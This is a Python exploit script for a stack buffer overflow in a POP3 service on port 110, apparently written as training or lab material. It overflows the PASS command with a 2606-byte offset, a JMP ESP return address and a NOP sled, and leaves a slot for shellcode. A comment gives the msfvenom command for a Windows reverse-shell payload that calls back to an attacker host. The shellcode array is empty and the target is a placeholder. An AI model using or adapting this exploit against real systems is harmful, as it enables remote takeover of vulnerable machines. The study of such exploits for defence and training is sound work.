#!/usr/bin/python

import socket
import sys
import subprocess

TARGET = "xxxx"
PORT = 110

CRASH_LEN = 3000
OVERFLOW_LEN = 2606
JMP_ESP = '\x8f\x35\x4a\x5f'
NOP_SLED = "\x90" * 32

send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n'))
run_proc = lambda cmd_list : str(subprocess.check_output(cmd_list)).strip()

# --- Final ---
# msfvenom -p windows/shell_reverse_tcp LHOST=xxxx LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\xff" -f c -a x86
payload =  ()

junk =  "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP) - len(payload) - len(NOP_SLED))
payload = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + payload + junk

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))
    s.recv(1024)
    send(s, 'USER', 'test')
    s.recv(1024)
    send(s, 'PASS ', payload)
    s.recv(1024)
    send(s, 'QUIT', '')
    s.close()
except Exception as e:
    print("DEBUG INFO: {}".format(e))
    sys.exit()
